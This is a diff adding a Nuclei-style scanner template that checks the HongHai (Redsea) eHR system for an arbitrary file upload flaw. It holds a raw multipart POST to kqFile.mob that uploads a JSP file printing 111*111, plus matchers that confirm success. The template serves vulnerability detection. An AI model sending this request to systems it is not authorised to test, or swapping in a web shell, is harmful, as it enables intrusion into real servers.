@@ -1,0 +1,31 @@
+id: poc-yaml-hr-soft-ehr-kqfile-upload
+
+info:
+  name: 红海云eHR系统kgFile.mob存在任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+http:
+  - raw:
+      - |
+        POST /RedseaPlatform/kqFile.mob?method=uploadFile&fileName=fbjgrohu.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeaaGwoqCxccjHcca
+
+        ------WebKitFormBoundaryeaaGwoqCxccjHcca
+        Content-Disposition: form-data; name="fj_file"; filename="fbjgrohu.jpg"
+        
+        <% out.println(111*111); %>
+        ------WebKitFormBoundaryeaaGwoqCxccjHcca--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"meg\" : \"处理成功\""
+          - "\"state\" : \"1\""
+          - "jsp"
+        part: body
